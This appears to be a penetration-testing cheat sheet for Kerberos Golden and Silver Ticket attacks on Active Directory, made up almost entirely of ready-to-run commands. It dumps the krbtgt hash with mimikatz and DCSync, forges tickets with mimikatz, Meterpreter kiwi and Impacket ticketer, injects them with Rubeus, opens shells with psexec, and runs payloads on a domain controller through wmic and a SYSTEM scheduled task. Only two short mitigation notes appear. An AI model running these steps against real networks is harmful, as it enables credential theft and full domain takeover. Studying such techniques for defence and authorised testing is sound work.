# GOLDEN TICKET

## Dump krbtgt hash to own the entire domain!

#### 1) mimikatz.exe

#### 2) privilege::debug

#### 3) lsadump::lsa /inject /name:krbtgt

#### 4) lsadump::lsa /patch

#### 5) lsadump::trust /patch

#### 6) lsadump::dcsync /user:krbtgt

#### 7) kerberos::purge

#### 8) kerberos::golden /user:Administrator /domain:domain.local /sid:SID /krbtgt:NTLM HASH /id:500(Admin) or 1103(Service)

#### 9) kerberos::tgt

#### 10) misc::cmd

## Alternate method: Meterpreter shell

### Get information for golden ticket

#### 1) dcsync_ntlm krbtgt

#### 2) dcsync krbtgt

### Forge a Golden Ticket

#### 3) load kiwi

#### 4) golden_ticket_create -d DOMAIN_NAME -k NTLM_HASH_OF_KRBTGT -s SID -u Administrator

#### 5) kerberos_ticket_purge

#### 6) kerberos_ticket_use /root/Downloads/Administrator.tck

#### 7) kerberos_ticket_list

### Authenticate with psexec impacket (Linux)

#### 8) ./psexec.py -k -no-pass -dc-ip 192.168.1.1 AD/administrator@192.168.1.100

## Alternate Method: Impacket Ticketer

#### 1) python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus

#### 2) export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache

#### 3) python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass

# SILVER TICKET

### Forging a Service Ticket (ST) require machine account password (key) or NT hash of the service account.

#### 1) mimikatz.exe

#### 2) privilege::debug

#### 3) lsadump::lsa /inject /name:SERVICE/DOMAIN ADMIN

### 1) Create a ticket for the service

 - mimikatz $ kerberos::golden /user:USERNAME /domain:DOMAIN.FQDN /sid:DOMAIN-SID /target:

 - mimikatz $ kerberos::golden /domain:jurassic.park /sid:S-1-5-21-1339291983-134912914

### 2) Use same steps as a golden ticket

 - mimikatz.exe "kerberos::golden /domain:DOMAIN /sid:DOMAIN_SID /rc4:HASH /user:USER /service:SERVICE /target:TARGET"

### Inject the ticket

 - mimikatz.exe "kerberos::ptt TICKET_FILE"

 - .\Rubeus.exe ptt /ticket:TICKET_FILE

### Obtain a shell

 - .\PsExec.exe -accepteula \\TARGET cmd

## Silver Ticket on Linux

 - python ticketer.py -nthash HASH -domain-sid DOMAIN_SID -domain DOMAIN -spn SERVICE_PRINCIPAL_NAME USER

 - export KRB5CCNAME=/root/impacket-examples/TICKET_NAME.ccache 

 - python psexec.py DOMAIN/USER@TARGET -k -no-pass



# Golden Ticket

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `lsadump::dcsync /domain:eagle.local /user:krbtgt`           | Command used in `mimikatz` to DCSync and dump the `krbtgt` password hash |
| `Get-DomainSID`                                              | Cmdlet from `PowerView` used to obtain the SID value of the domain. |
| `golden /domain:eagle.local /sid:<domain sid> /rc4:<rc4 hash> /user:Administrator /id:500 /renewmax:7 /endin:8 /ptt` | Command used in `mimikatz` to forge a golden ticket for the `Administrator` account and pass the ticket to the current session |
| `klist`                                                      | Command line utility in Windows to display the contents of the Kerberos ticket cache. |


## TIP: If you need to swap ticket between Windows and Linux, you need to convert them with ticket_converter or kekeo .

### 1) Kekeo

 - misc::convert ccache ticket.kirbi

 - misc::convert kirbi ticket.ccache

### 2) Impacket ticket_converter

 - python ticket_converter.py velociraptor.ccache velociraptor.kirbi

 - python ticket_converter.py velociraptor.kirbi velociraptor.ccache

## MITIGATIONS

### 1) Hard to detect because they are legit TGT tickets

### 2) Mimikatz generates a golden ticket with a life-span of 10 years

## Services to target with a Silver Ticket

### Service Type --> Service Silver Tickets --> Attack

#### 1) WMI --> HOST + RPCSS --> wmic.exe /authority:"kerberos:DOMAIN\DC01" /node:"DC01" process call create "cmd /c evil.exe"

#### 2) Powershell Remoting --> CIFS + HTTP + (wsman?) --> New-PSSESSION -NAME PSC -ComputerName DC01; Enter-PSSession -Name PSC

#### 3) WinRM --> HTTP+ wsman --> New-PSSESSION -NAME PSC -ComputerName DC01; Enter-PSSession -Name PSC

#### 4) Scheduled Tasks --> HOST --> schtasks /create /s dc01 /SC WEEKLY /RU "NT Authority\System" /IN "SCOM Agent Health Check" /IR "C:/shell.ps1"

#### 5) Windows File Share (CIFS) --> CIFS --> dir \\dc01\c$

#### 6) LDAP operations including Mimikatz DCSync --> LDAP --> lsadump::dcsync /dc:dc01 /domain:domain.local /user:krbtgt

#### 7) Windows Remote Server Administration Tools (RSAT) --> RPCSS + LDAP + CIFS --> /

## MITIGATIONS

### Set the attribute "Account is Sensitive and Cannot be Delegated" to prevent lateral movement with the generated ticket.

